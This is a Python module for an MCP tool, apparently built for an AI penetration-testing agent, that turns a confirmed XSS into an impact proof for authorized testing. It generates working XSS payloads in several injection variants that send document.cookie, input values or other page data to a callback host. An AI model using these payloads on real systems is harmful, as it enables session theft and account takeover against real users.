"""xss_impact_proof — turn a CONFIRMED XSS into a benign, evidence-backed impact PoC.

`probe_xss_executed` proves a payload EXECUTES; this proves what that execution
GAINS (Rule 29: reflected XSS alone is LOW, XSS -> session theft is HIGH). It
generates impact payloads that beacon a MINIMUM marker to an out-of-band callback
(Burp Collaborator or an operator-provided URL — Rule 9a, never a fabricated
domain). The beacon reaching the callback is the proof.

This is NOT a keylogging / session-hijacking C2 (toxssin/BeEF). Scope: the
operator's OWN session or a lab victim-bot (PortSwigger). Never harvest a real
user's data (Rules 7/8). The default `marker` capture sends ZERO page data;
`cookie` sends document.cookie to prove session-theft capability against your
own/lab session only. `storage` sends localStorage KEY NAMES, never values.
"""

from __future__ import annotations

import re

from mcp.server.fastmcp import FastMCP

# capture -> the JS expression beaconed as the proof 'd' value.
_CAPTURE = {
    "marker": "'xss-impact'",                              # fixed token, zero page data
    "cookie": "encodeURIComponent(document.cookie)",       # session-theft capability
    "title": "encodeURIComponent(document.title)",         # page-context proof
    "origin": "encodeURIComponent(location.href)",         # executes in the real origin
    "storage": "encodeURIComponent(Object.keys(localStorage).join(','))",  # KEY NAMES only
}
_MARKER = "ximp"


def _normalize_cb(cb: str) -> str:
    cb = (cb or "").strip()
    if not cb:
        return ""
    if not re.match(r"^https?://", cb):
        cb = "https://" + cb
    return cb.rstrip("/")


def _beacon_js(cb: str, data_expr: str) -> str:
    # GET image beacon — the most CSP-permissive exfil channel.
    return f"new Image().src='{cb}/x?m={_MARKER}&d='+{data_expr}"


def _variants(js: str) -> list[tuple[str, str]]:
    return [
        ("script-tag", f"<script>{js}</script>"),
        ("img-onerror", f'<img src=x onerror="{js}">'),
        ("svg-onload", f'<svg onload="{js}">'),
        ("attr-break", f'"><img src=x onerror="{js}">'),
        ("js-string-double", f'";{js};//'),
        ("js-string-single", f"';{js};//"),
        ("raw-js", js),  # DOM-sink / eval / javascript: context
    ]


def register(mcp: FastMCP):

    @mcp.tool()
    async def xss_impact_proof(callback: str = "", capture: str = "marker",
                               selector: str = "", finding_id: str = "") -> dict:
        """Generate benign XSS impact-proof payloads — the execution->impact escalation
        for a CONFIRMED XSS (after probe_xss_executed).

        Each payload beacons a MINIMUM marker to an out-of-band callback; the beacon
        reaching the callback proves the capability (e.g. session theft). A received
        beacon escalates the finding from reflected-XSS/LOW to session-theft/HIGH —
        then save_finding with chain_with=[the xss finding], impact=...

        SAFETY (HARD): use ONLY against your OWN session or a lab victim-bot
        (PortSwigger). Never run it against real users (Rules 7/8). OOB must be a Burp
        Collaborator payload or an operator-supplied URL — never a fabricated domain
        (Rule 9a). This is not a keylogging C2.

        Args:
            callback: a Burp Collaborator payload (from generate_collaborator_payload)
                or your own OOB URL (interact.sh / webhook.site). Required.
            capture: what the beacon carries — 'marker' (default; zero page data,
                proves the exec+exfil path), 'cookie' (document.cookie — session-theft
                proof on your own/lab session), 'title', 'origin', 'storage'
                (localStorage KEY NAMES only), or 'token' (needs `selector`).
            selector: CSS selector of the input to read when capture='token'.
            finding_id: the confirmed XSS finding to chain this impact onto.
        """
        capture = (capture or "marker").lower()
        if capture == "token":
            if not selector.strip():
                return {"error": "capture='token' needs selector= (a CSS selector for the input to read)"}
            sel = selector.replace("'", "\\'")
            data_expr = f"encodeURIComponent((document.querySelector('{sel}')||{{}}).value||'')"
        elif capture in _CAPTURE:
            data_expr = _CAPTURE[capture]
        else:
            return {"error": f"unknown capture {capture!r} (marker|cookie|title|origin|storage|token)"}

        cb = _normalize_cb(callback)
        if not cb:
            return {"error": "no callback — pass a Burp Collaborator payload "
                             "(generate_collaborator_payload) or your own OOB URL "
                             "(interact.sh / webhook.site). Rule 9a: never fabricate a domain.",
                    "capture": capture}

        js = _beacon_js(cb, data_expr)
        return {
            "capture": capture,
            "callback": cb,
            "marker": _MARKER,
            "payloads": [{"context": label, "payload": p} for label, p in _variants(js)],
            "confirm": ("inject a payload at the confirmed XSS sink against YOUR OWN session "
                        "or a lab victim-bot, then get_collaborator_interactions() (or poll your "
                        "callback). The beacon's 'd' parameter carries the proof."),
            "chain_with": finding_id or "<xss finding_id>",
            "severity_note": ("a received beacon escalates the XSS from reflected/LOW to "
                              "session-theft/HIGH — save_finding with chain_with=[xss], impact=..."),
            "safety": ("benign impact proof. Use ONLY against your own session or a lab "
                       "victim-bot. 'marker' sends zero page data; 'cookie' proves session "
                       "theft on your own/lab session. Never target real users (Rules 7/8); "
                       "OOB via Collaborator / operator callback only (Rule 9a). Not a C2."),
        }
